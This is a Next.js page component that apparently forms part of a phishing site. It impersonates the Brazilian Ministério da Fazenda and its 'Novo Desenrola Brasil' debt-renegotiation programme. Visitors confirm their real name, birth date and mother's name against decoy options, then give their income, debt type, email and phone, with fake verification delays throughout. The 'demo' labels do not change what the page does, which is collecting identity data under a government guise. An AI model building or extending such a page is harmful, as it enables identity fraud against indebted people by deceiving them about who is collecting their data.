"use client";
import { useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { Check, LoaderCircle } from "lucide-react";
import { SecondaryNav } from "@/components/layout";
import { Container } from "@/components/ui";
import { saveDemoFlow, type DemoAnswers } from "@/lib/demo-flow";
import { useDemoFlow } from "@/lib/use-demo-flow";

type Field = {
  key: keyof DemoAnswers;
  prompt: string;
  placeholder: string;
  type?: string;
  options?: Array<{ value: string; label: string }>;
};

const fakeNames = [
  "Carlos Eduardo Martins",
  "Fernanda Lima Souza",
  "Ricardo Almeida Santos",
  "Patricia Nogueira Silva",
];

const fakeMotherNames = [
  "Marta Regina Oliveira",
  "Claudia Beatriz Ferreira",
  "Rosana Cristina Pereira",
  "Helena Duarte Ramos",
];

const fakeBirthDates = ["1989-04-13", "1996-10-27", "1992-07-05", "1985-01-21"];

type ConfirmationKey = "fullName" | "birthDate" | "motherName";

function formatDateLabel(isoDate: string) {
  const parts = isoDate.split("-");
  if (parts.length !== 3) return isoDate;
  const [year, month, day] = parts;
  return `${day}/${month}/${year}`;
}

function pickThreeOptions(realValue: string, distractors: string[]) {
  const base = distractors.filter((value) => value && value !== realValue);
  const selectedDistractors = base.slice(0, 2);
  const options = [realValue, ...selectedDistractors].filter(Boolean);

  for (let index = options.length - 1; index > 0; index--) {
    const random = Math.floor(Math.random() * (index + 1));
    [options[index], options[random]] = [options[random], options[index]];
  }

  return options;
}

function buildFields(realName: string, realBirthDate: string, realMotherName: string) {

  const nameOptions = pickThreeOptions(realName, fakeNames).map((name) => ({
    value: name,
    label: name,
  }));
  const motherOptions = pickThreeOptions(realMotherName, fakeMotherNames).map(
    (name) => ({ value: name, label: name }),
  );
  const birthOptions = pickThreeOptions(realBirthDate, fakeBirthDates).map(
    (isoDate) => ({ value: isoDate, label: formatDateLabel(isoDate) }),
  );

  return [
    {
      key: "fullName",
      prompt: "Confirme seu nome completo",
      placeholder: "Selecione seu nome",
      options: nameOptions,
    },
    {
      key: "birthDate",
      prompt: "Confirme sua data de nascimento",
      placeholder: "Selecione sua data",
      options: birthOptions,
    },
    {
      key: "motherName",
      prompt: "Confirme o nome da sua mae",
      placeholder: "Selecione o nome da mae",
      options: motherOptions,
    },
    {
      key: "monthlyIncome",
      prompt: "Qual e sua faixa salarial atual?",
      placeholder: "Selecione",
      options: [
        {
          value: "UNEMPLOYED",
          label: "Desempregado(a)",
        },
        {
          value: "UP_TO_2640",
          label: "Ate R$ 2.640 (ate 2 Salarios Minimos)",
        },
        {
          value: "2641_TO_6600",
          label: "De R$ 2.641 A R$ 6.600 (2 A 5 Salarios Minimos)",
        },
        {
          value: "6601_TO_13200",
          label: "De R$ 6.601 A R$ 13.200 (5 A 10 Salarios Minimos)",
        },
        {
          value: "ABOVE_13200",
          label: "Acima De R$ 13.200 (mais De 10 Salarios Minimos)",
        },
      ],
    },
    {
      key: "debtType",
      prompt: "Qual o tipo de divida que deseja renegociar?",
      placeholder: "Selecione",
      options: [
        {
          value: "BANKING",
          label: "Dividas Bancarias (banco, Financeira)",
        },
        {
          value: "CARD",
          label: "Cartao De Credito",
        },
        {
          value: "FINANCING",
          label: "Financiamento De Veiculo Ou Imovel",
        },
        {
          value: "SERVICES",
          label: "Contas De Servicos (agua, Luz, Telefone)",
        },
        {
          value: "OTHER",
          label: "Outros Tipos De Divida",
        },
      ],
    },
    {
      key: "email",
      prompt: "Qual e o seu email?",
      placeholder: "Digite seu e-mail",
      type: "email",
    },
    {
      key: "phone",
      prompt: "Qual e o seu telefone?",
      placeholder: "(00) 00000-0000",
      type: "tel",
    },
  ] as Field[];
}

function getRealValue(flow: ReturnType<typeof useDemoFlow>, key: ConfirmationKey) {
  if (!flow) return "";
  if (key === "fullName") return flow.profile.displayName?.trim() || "";
  if (key === "birthDate") return flow.profile.birthDate || "";
  return flow.profile.motherName?.trim() || "";
}

function maskPhone(value: string) {
  const d = value.replace(/\D/g, "").slice(0, 11);
  if (d.length <= 2) return d;
  if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
  return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
}
const emailDomains = [
  "gmail.com",
  "hotmail.com",
  "outlook.com",
  "yahoo.com.br",
  "uol.com.br",
  "bol.com.br",
  "terra.com.br",
];
function emailSuggestions(value: string) {
  const separator = value.indexOf("@");
  if (separator <= 0 || value.includes(" ")) return [];
  const local = value.slice(0, separator);
  const typedDomain = value.slice(separator + 1).toLowerCase();
  return emailDomains
    .filter((domain) => domain.startsWith(typedDomain))
    .map((domain) => `${local}@${domain}`)
    .filter((suggestion) => suggestion.toLowerCase() !== value.toLowerCase());
}
function validate(key: keyof DemoAnswers, value: string) {
  if (
    key === "fullName" &&
    (!/^[\p{L} .'-]{5,}$/u.test(value.trim()) ||
      value.trim().split(/\s+/).length < 2)
  )
    return "Digite seu nome completo.";
  if (key === "motherName" && value.trim().length < 5)
    return "Selecione o nome da mae.";
  if (key === "monthlyIncome" && !value) return "Selecione uma faixa de renda.";
  if (
    key === "birthDate" &&
    (!value || new Date(value) >= new Date("2010-01-01"))
  )
    return "Digite uma data de nascimento válida.";
  if (key === "debtType" && !value) return "Selecione uma categoria.";
  if (key === "email" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/i.test(value))
    return "Digite um e-mail válido.";
  if (key === "phone" && !/^\(\d{2}\) 9\d{4}-\d{4}$/.test(value))
    return "Digite um telefone válido com DDD.";
  return "";
}

export default function VerificationPage() {
  const router = useRouter();
  const flow = useDemoFlow();
  const [error, setError] = useState("");
  const [status, setStatus] = useState<"idle" | "loading" | "success">("idle");
  if (!flow)
    return (
      <>
        <SecondaryNav title="Ministério da Fazenda" />
        <main className="bg-[#f8f8f8]">
          <Container className="py-12">
            <section className="mx-auto max-w-[800px] rounded-md bg-white p-8 text-center shadow-[0_2px_4px_#0003]">
              <h1 className="text-2xl font-semibold text-[#0c326f]">
                Dados não encontrados
              </h1>
              <p className="mt-3 text-[#555]">
                Volte à página inicial e informe o identificador.
              </p>
              <button
                onClick={() => router.push("/")}
                className="mt-6 rounded-full bg-[#1351b4] px-8 py-3 font-bold text-white"
              >
                Voltar
              </button>
            </section>
          </Container>
        </main>
      </>
    );
  const activeFlow = flow;
  const dynamicFields = useMemo(
    () =>
      buildFields(
        activeFlow.profile.displayName?.trim() || "",
        activeFlow.profile.birthDate || "",
        activeFlow.profile.motherName?.trim() || "",
      ),
    [
      activeFlow.profile.displayName,
      activeFlow.profile.birthDate,
      activeFlow.profile.motherName,
    ],
  );
  const index = Math.min(activeFlow.verificationStep, dynamicFields.length - 1);
  const field = dynamicFields[index];
  const value = activeFlow.answers[field.key];
  const suggestions = field.key === "email" ? emailSuggestions(value) : [];
  function update(next: string) {
    saveDemoFlow({
      ...activeFlow,
      answers: {
        ...activeFlow.answers,
        [field.key]: field.key === "phone" ? maskPhone(next) : next,
      },
    });
    setError("");
  }
  async function confirm() {
    if (
      field.key === "fullName" ||
      field.key === "birthDate" ||
      field.key === "motherName"
    ) {
      const realValue = getRealValue(activeFlow, field.key);
      if (!value) {
        setError("Selecione uma opcao para confirmar.");
        return;
      }
      if (value !== realValue) {
        setError("Opcao incorreta. Confirme o dado real retornado na consulta.");
        return;
      }
    }

    const validationError = validate(field.key, value);
    if (validationError) {
      setError(validationError);
      return;
    }
    setStatus("loading");
    await new Promise((r) => setTimeout(r, index === 0 ? 5000 : 3500));
    setStatus("success");
    await new Promise((r) => setTimeout(r, 350));
    if (index === dynamicFields.length - 1) {
      router.push("/saiba-mais");
      return;
    }
    saveDemoFlow({ ...activeFlow, verificationStep: index + 1 });
    setStatus("idle");
  }
  return (
    <>
      <main className="min-h-[65vh] bg-[#f8f8f8]">
        <Container className="py-5 sm:py-6">
          <section className="mx-auto w-full max-w-[800px] rounded-md bg-white px-6 py-8 shadow-[0_2px_4px_#0003] sm:px-12">
            <h1 className="text-center text-[18px] font-bold leading-6 text-[#222]">
              Confirme seus dados para o cadastro no Novo Desenrola Brasil
            </h1>
            <div className="mx-auto mt-5 w-full max-w-[720px]">
              <div className="flex items-center justify-start gap-2.5">
                <div className="flex size-6 shrink-0 items-center justify-center rounded-full bg-[#1351b4] text-sm font-bold text-white">
                  {index + 1}
                </div>
                <label
                  htmlFor={`field-${field.key}`}
                  className="text-base font-semibold text-[#222]"
                >
                  {field.prompt}
                </label>
              </div>
              {field.options ? (
                <div
                  id={`field-${field.key}`}
                  role="radiogroup"
                  aria-label={field.prompt}
                  className="mt-4 grid gap-3"
                >
                  {field.options.map((option) => (
                    <button
                      key={option.value}
                      type="button"
                      role="radio"
                      aria-checked={value === option.value}
                      onClick={() => update(option.value)}
                      disabled={status !== "idle"}
                      className={`min-h-[54px] rounded-md border-0 bg-[#f7f7f7] px-3 py-3 text-left text-base font-semibold transition ${value === option.value ? "bg-[#e7f0ff] text-[#0c326f] ring-2 ring-[#1351b4]" : "text-[#222] hover:bg-[#eef3fa]"}`}
                    >
                      {option.label}
                    </button>
                  ))}
                </div>
              ) : (
                <input
                  id={`field-${field.key}`}
                  type={field.type ?? "text"}
                  inputMode={
                    field.key === "phone" ? "numeric" : undefined
                  }
                  value={value}
                  onChange={(e) => update(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === "Enter") void confirm();
                  }}
                  placeholder={field.placeholder}
                  disabled={status !== "idle"}
                  autoComplete="off"
                  className="mt-4 h-11 w-full rounded border border-[#888] px-4 text-base outline-none placeholder:text-[#777] focus:border-[#1351b4] focus:ring-1 focus:ring-[#1351b4]"
                />
              )}
              {suggestions.length > 0 && (
                <div
                  className="mt-2 overflow-hidden rounded-md border border-[#bbb] bg-white shadow-sm"
                  role="listbox"
                  aria-label="Sugestões de e-mail"
                >
                  {suggestions.map((suggestion) => (
                    <button
                      key={suggestion}
                      type="button"
                      role="option"
                      aria-selected="false"
                      onClick={() => update(suggestion)}
                      className="block w-full border-b border-[#eee] px-4 py-2.5 text-left text-sm text-[#333] last:border-b-0 hover:bg-[#e7f0ff]"
                    >
                      {suggestion}
                    </button>
                  ))}
                </div>
              )}
              {error && (
                <p
                  role="alert"
                  className="mt-2 text-center text-sm font-semibold text-[#b00020]"
                >
                  {error}
                </p>
              )}
              <button
                onClick={() => void confirm()}
                disabled={
                  status !== "idle" || (Boolean(field.options) && !value)
                }
                className="mx-auto mt-6 flex min-h-10 min-w-[160px] items-center justify-center gap-2 rounded-full bg-[#1351b4] px-7 font-bold text-white disabled:opacity-60"
              >
                {status === "loading" ? (
                  <>
                    <LoaderCircle className="size-5 animate-spin" />
                    Confirmando...
                  </>
                ) : status === "success" ? (
                  <>
                    <Check className="size-5" />
                    Confirmado
                  </>
                ) : (
                  "Confirmar"
                )}
              </button>
              {index > 0 && (
                <button
                  onClick={() => {
                    saveDemoFlow({
                      ...activeFlow,
                      verificationStep: index - 1,
                    });
                    setError("");
                    setStatus("idle");
                  }}
                  disabled={status !== "idle"}
                  className="mx-auto mt-4 block text-sm font-semibold text-[#1351b4]"
                >
                  Voltar
                </button>
              )}
            </div>
          </section>
        </Container>
      </main>
    </>
  );
}
